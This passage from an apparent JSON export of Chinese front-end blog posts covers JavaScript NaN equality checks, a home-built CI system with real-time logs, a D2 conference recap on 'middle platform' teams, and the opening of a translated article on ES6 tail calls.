\u003ccode\u003eNaN\u003c/code\u003e 就可以了。\u003c/p\u003e\n\u003cp\u003e下面这段便是处理 \u003ccode\u003eNaN\u003c/code\u003e 的：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e(value !== value \u0026amp;\u0026amp; other !== other)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在 js 中，只有 \u003ccode\u003eNaN\u003c/code\u003e 和自身是不相等的，当两个需要比较的值都是和自身不相等时，表明这两个值都为 \u003ccode\u003eNaN\u003c/code\u003e，返回 \u003ccode\u003etrue\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e这样便遵循了 \u003ccode\u003eSameValueZero\u003c/code\u003e 的比较实现。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e可以用Object.is()吗？\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eObject.is(NaN, NaN)\u003c/code\u003e 返回的是 \u003ccode\u003etrue\u003c/code\u003e ，所以 \u003ccode\u003eeq\u003c/code\u003e 同样可以改成：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eeq\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003evalue, other\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e value === other || \u003cspan class=\"hljs-built_in\"\u003eObject\u003c/span\u003e.is(value, other)\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eObject.is\u003c/code\u003e 同样是比较两个值是否一样，但是 \u003ccode\u003eObject.is(+0, -0)\u003c/code\u003e 返回的是 \u003ccode\u003efalse\u003c/code\u003e， 它遵循是的 \u003ccode\u003eSameValue\u003c/code\u003e 规范，因此不可以直接用 \u003ccode\u003eObject.is\u003c/code\u003e 替代 \u003ccode\u003eeq\u003c/code\u003e 。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e可以用isNaN()吗？\u003c/h2\u003e\n\u003cp\u003e还有个 \u003ccode\u003eisNaN\u003c/code\u003e 的全局方法，可以用来判断一个值是否为 \u003ccode\u003eNaN\u003c/code\u003e。例如 \u003ccode\u003eisNaN(NaN)\u003c/code\u003e 会返回 \u003ccode\u003etrue\u003c/code\u003e ，那 \u003ccode\u003eeq\u003c/code\u003e 是否可以改成以下形式呢？\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eeq\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003evalue, other\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e value === other || (\u003cspan class=\"hljs-built_in\"\u003eisNaN\u003c/span\u003e(value) \u0026amp;\u0026amp; \u003cspan class=\"hljs-built_in\"\u003eisNaN\u003c/span\u003e(other))\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e答案是：不可以！\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eisNaN\u003c/code\u003e 有一个很怪异的行为，如果传入的参数不为 \u003ccode\u003eNumber\u003c/code\u003e 类型，会尝试转换成 \u003ccode\u003eNumber\u003c/code\u003e 类型之后再做是否为 \u003ccode\u003eNaN\u003c/code\u003e 的判断。所以类似 \u003ccode\u003eisNaN('notNaN')\u003c/code\u003e 返回的也是 \u003ccode\u003etrue\u003c/code\u003e ，因为字符串 \u003ccode\u003enotNaN\u003c/code\u003e 会先被转换成 \u003ccode\u003eNaN\u003c/code\u003e 再做判断，这不是我们想要的结果。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e可以用Number.isNaN()吗\u003c/h2\u003e\n\u003cp\u003e为了修复 \u003ccode\u003eisNaN\u003c/code\u003e 的缺陷，\u003ccode\u003ees6\u003c/code\u003e 在 \u003ccode\u003eNumber\u003c/code\u003e 对象上扩展了 \u003ccode\u003eisNaN\u003c/code\u003e 方法，只有是 \u003ccode\u003eNaN\u003c/code\u003e 时才会返回 \u003ccode\u003etrue\u003c/code\u003e，因此用 \u003ccode\u003eNumber.isNaN\u003c/code\u003e 来判断是安全的。所以 \u003ccode\u003eeq\u003c/code\u003e 同样可以改成以下形式：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eeq\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003evalue, other\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e value === other || (\u003cspan class=\"hljs-built_in\"\u003eNumber\u003c/span\u003e.isNaN(value) \u0026amp;\u0026amp; \u003cspan class=\"hljs-built_in\"\u003eNumber\u003c/span\u003e.isNaN(other))\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e参考\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://ecma-international.org/ecma-262/7.0/#sec-samevaluenonnumber\"\u003eECMAScript® 2016 Language Specification\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Number/isNaN\"\u003eMDN:Number.isNaN()\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/isNaN\"\u003eMDN:isNaN()\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 class=\"heading\"\u003eLicense\u003c/h2\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://creativecommons.org/licenses/by-nc-nd/4.0/\"\u003e署名-非商业性使用-禁止演绎 4.0 国际 (CC BY-NC-ND 4.0)\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e最后，所有文章都会同步发送到微信公众号上，欢迎关注,欢迎提意见：  \u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/7/1602e879207eb857?w=430\u0026amp;h=430\u0026amp;f=jpeg\u0026amp;s=40267\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e作者：对角另一面\u003c/p\u003e\n","buildTime":"1515066288.4383","__v":0}
{"_id":{"$oid":"5a4e17dee8405d2778beac80"},"id":"5a4e01716fb9a044fc452942","author":{"$oid":"5a4e17dee8405d2778beac71"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/4/160c0c3e04bc3ca2?w=1228\u0026h=906\u0026f=png\u0026s=130834"],"screenShot":null}],"title":"自己写一个H5项目CI系统","meta":{"likeCount":0},"tag":["前端","Jenkins","百度","Vue.js"],"comment":[],"shortContent":"持续集成（Continuous integration，简称CI)系统在软件自动化构建（包括编译、发布、自动化测试）方面有着重要的作用，在之前，前端项目简单，很多时候发布都只是一些简单的拷贝，而随着webpack web打包工具的诞生，前端项目越来越复杂，大多数项目都需要一个构…","content":"\u003cp\u003e持续集成（Continuous integration，简称CI)系统在软件自动化构建（包括编译、发布、自动化测试）方面有着重要的作用，在之前，前端项目简单，很多时候发布都只是一些简单的拷贝，而随着webpack web打包工具的诞生，前端项目越来越复杂，大多数项目都需要一个构建的流程，在这个时候我们自然而然想到了jenkins，于是将前端项目也集成到了jenkins,  事情到这里还算完美，直到有一天.......\u003c/p\u003e\n\u003cp\u003e那还是我在上一家公司时候，有一天我突然了解到公司的前端团队项目打包发布是用自己写的一套打包系统之后，我很惊讶，为什么不用jenkins? 才发现，其实很多只做过前端的并不是很了解持续集成这些，想来也是，前端之前的开发模式基本都不用打包构建，发布时都是把所有的模板、资源打包（压缩）发给运维。于是我看了一下他们那个打包的系统，也只是可以完成线上打包的功能，对实时日志、构建队列、构建触发器等都不支持，于是我就开始给他们安利jenkins，但是，现有的系统系统虽然简陋但也能用，大家心里其实是拒绝的。强推应该不是上策，于是我就说如果现在这个构建系统能够支持实时日志和任务队列的话也是不错的，大家一看，这开发量可不小，还不如迁移到了jenkins呢， 于是前端的项目就迁移到了jenkins.......\u003c/p\u003e\n\u003cp\u003e故事到这里还没完。\u003c/p\u003e\n\u003cp\u003e没有什么能够阻挡人类的好奇心啊。事后我心里就想着如果能够我们自己做一个前端构建系统，要支持实时日志和任务队列，应该怎么做。\u003c/p\u003e\n\u003cp\u003e正巧，虽然jenkins本身功能很强大，但是，也有一点有些不足，就是打包日志不能像本地一样带有格式，如日志文字颜色、字体等，这样的话，就不能像在本地打包一样快速的定位错误。然后百度了一圈，发现有一个插件，叫 AnsiColor, 心中大喜，立马重新build，但是发现日志的格式化功能非常的弱，以一个vue工程为例，输出的日志本应显示红色的（构建过程出错）的都是黑色，真是差强人意。于是我就想着自己写一套前端专用的ci, 当然不是为了重复发明轮子，纯粹手痒。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e要实现的目标\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e支持实时日志，并有良好的格式\u003c/li\u003e\n\u003cli\u003e支持任务队列\u003c/li\u003e\n\u003cli\u003e支持触发器\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003e技术点：\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e任务队列可以在服务端维护一个全局的任务列表\u003c/li\u003e\n\u003cli\u003e实时日志用websocket将服务端的打包信息实时的同步到页面上\u003c/li\u003e\n\u003cli\u003e日志格式化可以百度 “ANSI控制码”，我们解析ANSI控制码来应用自定义样式。\u003c/li\u003e\n\u003cli\u003e触发器可以通过项目配置脚本，在关键点触发某个自定义脚本\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e于是写好就是这样的:\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c0c3e04bc3ca2?w=1228\u0026amp;h=906\u0026amp;f=png\u0026amp;s=130834\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e顶部是项目信息，红色乌云代表构建失败，绿色的太阳代表构建成功。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"日志格式化\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c0b6d5619ee36?w=1225\u0026amp;h=915\u0026amp;f=png\u0026amp;s=215510\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e构建日志格式化。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"实时日志\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c0b784901376a?w=882\u0026amp;h=662\u0026amp;f=png\u0026amp;s=60842\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e构建过程中打印实时日志\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"构建队列\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c0b812c4cea06?w=1226\u0026amp;h=350\u0026amp;f=png\u0026amp;s=42492\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n与多个构建任务时，排队等候\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e总结\u003c/h3\u003e\n\u003cp\u003e此项目是一个很好的练习项目，涉及前端、后台、websocket、shell脚本。个人觉得很适合做一个毕业设计或实习作业。现在这个项目已经是我们前端实习生的必做项目了。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e招贤纳士\u003c/h3\u003e\n\u003cp\u003e如果你是一个爱思考，爱动手，对编程有浓厚兴趣的欢迎私信我。\u003c/p\u003e\n","buildTime":"1515067353.6178","__v":0}
{"_id":{"$oid":"5a4e17dee8405d2778beac8a"},"id":"5a4dcb186fb9a0451d41e4a5","author":{"$oid":"5a4e17dee8405d2778beac75"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/4/160bfe147ba0b745?w=1636\u0026h=1114\u0026f=jpeg\u0026s=101977","https://user-gold-cdn.xitu.io/2018/1/4/160bfe1481c34556?w=1708\u0026h=1068\u0026f=jpeg\u0026s=189898","https://user-gold-cdn.xitu.io/2018/1/4/160bfe147c28ec31?w=640\u0026h=385\u0026f=jpeg\u0026s=45138","https://user-gold-cdn.xitu.io/2018/1/4/160bfe147c6c5795?w=2048\u0026h=1146\u0026f=jpeg\u0026s=627079","https://user-gold-cdn.xitu.io/2018/1/4/160bfe147c7891db?w=2048\u0026h=1153\u0026f=jpeg\u0026s=859573","https://user-gold-cdn.xitu.io/2018/1/4/160bfe147e53a263?w=2048\u0026h=1132\u0026f=jpeg\u0026s=663108","https://user-gold-cdn.xitu.io/2018/1/4/160bfe14cddc2ead?w=2048\u0026h=1148\u0026f=jpeg\u0026s=563497","https://user-gold-cdn.xitu.io/2018/1/4/160bfe14ce238953?w=1996\u0026h=1146\u0026f=jpeg\u0026s=248763"],"screenShot":null}],"title":"又是一年D2：颇具匠心的中台技术修养","meta":{"likeCount":0},"tag":["前端","架构","React Native","React.js"],"comment":[],"shortContent":"杭州、西溪、冬、烟雨朦胧，又是一年阿里 D2。同样的会场，同样的人，但却是不一样的感受。 这届 D2 的主题是“匠心”，令笔者最为触动的词是“中台”，而笔者今年关注了 D2 新加入的主题“前端技术管理”，关注了团队与个人的“技术修养”问题，因此，结合几个关键词，给这篇文章起了一…","content":"\u003cp\u003e杭州、西溪、冬、烟雨朦胧，又是一年阿里 D2。同样的会场，同样的人，但却是不一样的感受。\u003c/p\u003e\n\u003cp\u003e这届 D2 的主题是“匠心”，令笔者最为触动的词是“中台”，而笔者今年关注了 D2 新加入的主题“前端技术管理”，关注了团队与个人的“技术修养”问题，因此，结合几个关键词，给这篇文章起了一个比较文艺的题目《颇具匠心的中台技术修养》。\u003c/p\u003e\n\u003cp\u003e与以往不同，由于在团队中身份的转变，这次来 D2，对业界方向的关注要远超于对前端技术细节的关心，因此，“技术管理”和“技术方案的整体设计”是这次笔者所重点关注的。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e第一小节 —— 成长\u003c/h3\u003e\n\u003cp\u003e经过几年的发展，前端的技术成熟度和稳定性已经到了一个很高的水平，虽然各种轮子层出不穷，但是技术体系和架构已经趋于稳定，这个时候，如何管理好团队使用的技术栈，既不“故步自封”，也不“横冲冒进”，是现在前端团队、终端团队管理者需要重点关注的问题。而今年，D2也推出了前端管理的主题，几位有丰富经验的前端团队 Leader 向大家分享了他们的经验。\u003c/p\u003e\n\u003cp\u003e其中，让笔者感触最深的是 \u003cstrong\u003e月影\u003c/strong\u003e 带来的 \u003cstrong\u003e《自我成长的多元化团队》\u003c/strong\u003e。笔者从之前的单打独斗，到现在带领团队一起奋战，团队成员的成长一直是笔者花费很大精力去关注但成效不多的地方，而遇到的问题大部分都在月影的分享中被提到，因此感触颇多。其中 \u003cstrong\u003e“多元化”\u003c/strong\u003e 和 \u003cstrong\u003e“闭环”\u003c/strong\u003e 是其中笔者觉得最为核心的两点。\u003c/p\u003e\n\u003cp\u003e在一个团队内，包含着风格、性格、能力各不同的成员，如何让每个成员都能体现出应有的价值，一直是团队 Leader 所遇到问题中的比较棘手。尤其是向笔者所在团队 \u003ca target=\"_blank\" href=\"http://ymfe.org\"\u003eYMFE\u003c/a\u003e 这样的负责公司大前端础架构与中台方案的团队中，每个成员体现的价值与其能力有时候相差甚多。再加上，团队每年都会招入一些没有什么业务经验的应届生，如何让应届生表现出其突出的价值，以致让团队认为其值得培养，并倾斜资源，也是件很闹心的事情。\u003c/p\u003e\n\u003cp\u003e在这里，月影提出一个观点 —— \u003cstrong\u003e“重组织、轻管理”\u003c/strong\u003e，对每个人单独的管理不如更宏观地规划处一系列的“大道”，让成员自行选择。当然，这里的一系列“大道”肯定要满足两个条件，就是上文所说的“多元化”和“闭环”（下图是 \u003cstrong\u003e奇舞团\u003c/strong\u003e 的多元化、多维度的成长空间）。虽然，当前团队也有类似的“大道”，但是维度并不足够；而且，当团队发展到一定的规模后，低维度的成长空间会可能会制约团队成员的行动力，所以，根据公司、团队自身情况建立不同的成长空间、成长路线是很有必要的，或许这将是笔者2018年在团队内主要推动的事情。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfe147ba0b745?w=1636\u0026amp;h=1114\u0026amp;f=jpeg\u0026amp;s=101977\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e相比于 “多元化”，笔者感觉 “闭环” 其实更为重要，不论是 “正面反馈” 还是 “负面反馈” 都是很有必要的。在一个纯技术团队中，成员自身的技术肯定在第一位，在技术之外，项目管理、新人导师、对外技术输出和分享等，都是很重要的。而在这些之中，尤其是 “对外技术输出和分享” 最难形成闭环，最难给从事者足够的反馈。有人说，形成闭环很简单，直接和绩效、晋升挂钩。当然只是一种方法，但它只能给成员压力，例如未完成时的“负面反馈”，而并没有带来更多的“正面反馈”。\u003c/p\u003e\n\u003cp\u003e其实，增加团队影响力，让团队成员都有团队自豪感，是最好的回馈方式。虽然这一年，团队也搞了 Conf 会议，同时也有一些开源项目，但笔者觉得收到的“正面反馈”并没有预想的那么多，尤其对低级别和新加入的成员。这不仅仅要在形式上下功夫，更要加强团队中每个人的团队意识，这应该是下一年需要重点提升的。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e第二小节 —— 务实\u003c/h3\u003e\n\u003cp\u003e在月影的分享中，有关管理者 \u003cstrong\u003e“积极”\u003c/strong\u003e 和 \u003cstrong\u003e“保守”\u003c/strong\u003e 的问题，也令人深省。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfe1481c34556?w=1708\u0026amp;h=1068\u0026amp;f=jpeg\u0026amp;s=189898\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e不管是积极的管理者还是保守的管理者，都很看重优秀的人才和高效的组织，因为优秀的人才加上高效、稳定的组织，才能形成一个优秀的团队。关于这点，绝大多数人都知道，并且有一定的认识。所以，笔者在这里就不多做赘述了，而谈一下，对前三点的看法和思考。\u003c/p\u003e\n\u003cp\u003e首先，对于 “保守” 这个偏贬义的词，笔者认为用 \u003cstrong\u003e“务实”\u003c/strong\u003e 更为贴切。直白点说，工资是公司发的，给公司创造价值才是当务之急，把技术用于业务、用于产品，减少业务的风险，或许是公司管理层更愿意看到的。打个比方，即时写了一个前无古人后无来者的无敌框架，如果不被业务所采用，到头来产出的也就那么几千行代码而已。\u003c/p\u003e\n\u003cp\u003e这里，可能读者会认为笔者是个偏“保守”的管理者，其实并不是。笔者是个大白羊，一往直前的创新绝对是不可磨灭的欲望，但是笔者更倾向于在“保守”的基础上“积极”，在“务实”的肩膀上“创新”。创新是着眼于未来，但你的创新是否对未来有效，却不能空口无凭。因此，所谓的创新要在务实的场景中提炼，提炼出未来所需要的创新。讲一个很简单的逻辑，在务实业务的过程中，发现了业务的痛点，需要一种新方式来解决，因此去创新。这样能保证你的创新不管结果怎样，出发点是有意义的，是可以被大家认同的。就像 React Native，它解决了业务急需热更新的需求的同时，提升了体验，做出了比 Web 更好的体验效果，因此受到了大家的青睐。而现在，React Native 的劣势也表现出来，例如，因为通信的瓶颈，List 的效率堪忧，再例如，Native 实现的组件不能热更新（至少 iOS 不行），这种情况下，我们又要如何去解决了？是做微创新，直接切入痛点，解决问题；还是做大创新，提出一个比 React Native 更好的架构形式，这才是管理者应该去深入考虑的。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e第三小节 —— 中台\u003c/h3\u003e\n\u003cp\u003e在上面的叙述中，笔者提到了“中台”这个词，并把团队的部分工作称为“中台方案”。其实，“中台”这个词，笔者是在 D2 上才关注到的，因为很多分享都提到了“中台”这个概念，也可能是因为分享人大多是阿里系的有关。“大中台，小前台”是阿里巴巴在2015年底提出的公司级战略，之后很多公司效仿，让很多之前的“公共支持团队”变成现在的“平台事业部”。公司战略层面的高深意义不是笔者一个小技术人员能理解的，不过，仅限技术而言，这样的战略，会减少多团队干一件事的概率，同时也让想做技术的同学可以一直单纯的做技术，不用去想“30后做管理，40后当经理”的事情。这或许是，单纯喜欢做技术的同学一个福音吧。（下图是2016年初阿里基于“大中台、小前台”战略制定的集团整体组织架构）\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfe147c28ec31?w=640\u0026amp;h=385\u0026amp;f=jpeg\u0026amp;s=45138\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e中台是什么？给前台提供工具、服务、模块等公共、统一化的资源。对于大前端技术来说，构建工具、开发平台、服务平台、公共组件都算作中台的范畴。在大前端基础架构趋于稳定的情况下（前端React、Angular、Vue 三分，客户端原生、Hybrid、React Native（包括类 RN）三分），除了基于现有架构，适配自身公司的基础研发外，更多的是，给业务提供技术方案支持，让业务方更快地进行开发迭代，这或许是当前大前端重点要做的。\u003c/p\u003e\n\u003cp\u003e当然，唯“中台”论，有时候也比较“可怕”。当前台的技术人员只关心业务，同时中台的技术人员不能提供满足前台的技术需求，这将是很可怕的一件事，因为很难弥补中间的空缺，或者这个问题成为拉锯战。因此，作为“中台”部分的工程师，要承受更大的压力，并拥有更深的技术。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e第四小节 —— 修养\u003c/h3\u003e\n\u003cp\u003e在“大中台，小前台”的环境中，大前端工程师，要有怎样的 \u003cstrong\u003e技术修养\u003c/strong\u003e 呢？直接贴 \u003cstrong\u003e盒马岑安\u003c/strong\u003e 的三张 PPT。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfe147c6c5795?w=2048\u0026amp;h=1146\u0026amp;f=jpeg\u0026amp;s=627079\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfe147c7891db?w=2048\u0026amp;h=1153\u0026amp;f=jpeg\u0026amp;s=859573\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfe147e53a263?w=2048\u0026amp;h=1132\u0026amp;f=jpeg\u0026amp;s=663108\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e“以史明鉴”\u003c/strong\u003e 一直是很好的分析方式。通过回顾前端的发展历程，每个阶段的技术，都是为了解决这个阶段的难题与痛点。虽然说，图中跟多是前端的内容，但是客户端与之是类似的。因此，可以说，大前端已经解决了从内容承载到体验优化，在从副交互到工程化，甚至包括开发模式等各个方面的问题，而解决这些问题的能力是当前大前端工程师的基本要求。\u003c/p\u003e\n\u003cp\u003e而现在呢？未来呢？笔者谈谈自己的想法。在业务形式不断扩展，“中台”变大的时代，大前端工程师，尤其是做架构的大前端工程师，更多地需要能 \u003cstrong\u003e耐得住寂寞\u003c/strong\u003e。不同于前几年，一个优秀的架构方案，可以翻江倒海；而现在，包括将来，要做的更多是为业务提供服务的工作，稳定和完善是关键。或者，你可能已经感受不到获得感，但是你做的东西的实际价值或许会更高，因为它会支撑比现在更多的业务。\u003c/p\u003e\n\u003cp\u003e最后，贴一张“核心竞争力”的 PPT —— 不仅仅要 \u003cstrong\u003e拆解\u003c/strong\u003e 后 \u003cstrong\u003e输出\u003c/strong\u003e ，更要 \u003cstrong\u003e落地\u003c/strong\u003e 于 \u003cstrong\u003e业务\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfe14cddc2ead?w=2048\u0026amp;h=1148\u0026amp;f=jpeg\u0026amp;s=563497\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e第五小节 —— 更好\u003c/h3\u003e\n\u003cp\u003e作为中台特征明显的大前端架构，究竟要做什么？或许是，\u003cstrong\u003e更完善的生态\u003c/strong\u003e 和 \u003cstrong\u003e更好的服务\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003e很简单的一个道理，当人吃饱了，就会要求吃得好、吃得方便、吃得有营养了。做架构也一样，当架构可以满足业务需求后，业务就会反过来，要求架构更稳定、更易用了。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfe14ce238953?w=1996\u0026amp;h=1146\u0026amp;f=jpeg\u0026amp;s=248763\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e上面是 \u003cstrong\u003e支付宝加里\u003c/strong\u003e 分享了一张PPT，类似的 Q 还包括很多，“为什么代码还是原来的”、“为什么点击没反应”、“iOS 没毛病，Android 挂了”。对于这类繁多的业务人员反馈的问题，是烦人也棘手的；你不能奢求业务人员去自己解决，况且有些问题，业务人员根本解决不了。在这时，你就需要一个完善的工具、服务等等其他的一些东西，来快速定位问题，或者来证明“问题不是框架的，是业务自身的”。因此，在未来一年或者几年，对于中台、对于大前端的架构团队，\u003cstrong\u003e更完善的生态\u003c/strong\u003e 和 \u003cstrong\u003e更好的服务\u003c/strong\u003e 应该被首要关注的。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e总结\u003c/h3\u003e\n\u003cp\u003e2017仍是大前端火热的一年，但发展也已经从“野蛮生长”变为“颇具匠心”，越来越多稳定成熟的架构方法被广泛使用。与此同时，时代的热点已经转到机器学习和加密货币，而主项是 UI 的大前端发展又将何去何从呢。或许历史已经给出答案，传统后端默默地做了许久的模块化、服务化，伴随着云的兴起，又迎来新一春。或许，大前端的“中台化”，是大前端发展接下来最重要的一步。\u003c/p\u003e\n\u003cp\u003e2018，新的一年，你好。\u003c/p\u003e\n\u003cp\u003eD2 更多视频 和 PPT 信息，请访问官网：\u003ca target=\"_blank\" href=\"http://d2forum.alibaba-inc.com/\"\u003ehttp://d2forum.alibaba-inc.com/\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1515067227.5557","__v":0}
{"_id":{"$oid":"5a4e17dee8405d2778beac89"},"id":"5a4d898a518825698e7277d1","author":{"$oid":"5a4b770f19da8721f49c06f8"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/11/17/15fc7e84adafedc2?imageView2/0/w/1280/h/960/ignore-error/1"],"screenShot":null}],"title":"[译] ES6中的尾调用优化","meta":{"likeCount":0},"tag":[],"comment":[],"shortContent":"1. 什么是尾调用优化 1.1. 正常的执行 1.2. 尾调用优化 2. 检查函数调用是否在尾部发生 2.1. 表达式中的尾调用 2.2. 声明语句中的尾调用 2.3. 尾调用优化只在严格模式下有效 2.4. 单独的函数调用不算在尾部 3. 尾递归函数 3.1. 尾递归循环 1…","content":"\u003cp\u003e\u003ci\u003e原文：http://exploringjs.com/es6/ch_tail-calls.html\u003c/i\u003e\u003c/p\u003e\u003cblockquote\u003e\u003cspan\u003eECMAScript 6 提供了尾调用优化(tail call optimization)功能，以使得对某些函数的调用不会造成调用栈(call stack)的增长。本文解释了这项功能，以及其带来的好处。\u003c/span\u003e\u003c/blockquote\u003e\u003cp\u003e\u003c/p\u003e\u003cdiv\u003e\u003c/div\u003e\u003cul\u003e\u003cli\u003e1. 什么是尾调用优化\u003cul\u003e\u003cli\u003e1.1. 正常的执行\u003c/li\u003e\u003cli\u003e1.2. 尾调用优化\u003c/li\u003e\u003c/ul\u003e\u003c/li\u003e\u003cli\u003e2. 检查函数调用是否在尾部发生\u003cul\u003e\u003cli\u003e2.1. 表达式中的尾调用\u003c/li\u003e\u003cli\u003e2.2. 声明语句中的尾调用\u003c/li\u003e\u003cli\u003e2.3. 尾调用优化只在严格模式下有效\u003c/li\u003e\u003cli\u003e2.4. 单独的函数调用不算在尾部\u003c/li\u003e\u003c/ul\u003e\u003c/li\u003e\u003cli\u003e3. 尾递归函数\u003cul\u003e\u003cli\u003e3.1. 尾递归循环\u003c/li\u003e\u003c/ul\u003e\u003c/li\u003e\u003c/ul\u003e\u003cdiv\u003e\u003c/div\u003e\u003ch3\u003e1. 什么是尾调用优化? 